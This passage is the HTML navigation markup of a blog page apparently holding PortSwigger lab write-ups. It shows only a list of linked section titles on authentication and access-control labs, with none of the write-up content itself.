page-catalog-item" aria-label="Username enumeration via subtly different responses"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Username enumeration via subtly different responses<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#username-enumeration-via-response-timing" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Username enumeration via response timing"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Username enumeration via response timing<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#broken-brute-force-protection-ip-block" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Broken brute-force protection, IP block"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Broken brute-force protection, IP block<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#username-enumeration-via-account-lock" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Username enumeration via account lock"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Username enumeration via account lock<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#_2fa-broken-logic" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="2FA broken logic"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->2FA broken logic<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#brute-forcing-a-stay-logged-in-cookie" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Brute-forcing a stay-logged-in cookie"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Brute-forcing a stay-logged-in cookie<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#offline-password-cracking" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Offline password cracking"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Offline password cracking<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#-6" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="------------------------------"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->------------------------------<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#unprotected-admin-functionality" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Unprotected admin functionality"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Unprotected admin functionality<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#unprotected-admin-functionality-with-unpredictable-url" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Unprotected admin functionality with unpredictable URL"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Unprotected admin functionality with unpredictable URL<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#user-role-controlled-by-request-parameter" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="User role controlled by request parameter"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->User role controlled by request parameter<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#user-role-can-be-modified-in-user-profile" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="User role can be modified in user profile"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->User role can be modified in user profile<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#user-id-controlled-by-request-parameter" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="User ID controlled by request parameter"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->User ID controlled by request parameter<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html#user-id-controlled-by-request-parameter-with-unpredictable-user-ids" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="User ID controlled by request parameter, with unpredictable user IDs"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->User ID controlled by request parameter, with unpredictable user IDs<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--></ul></div></main><!--]--></div><!--[--><!----><!----><div></div><!--]--><!--]--></div>
    <script type="module" src="/sake-s-blog/assets/app-D-TC3Ll_.js" defer></script>
  </body>
</html>
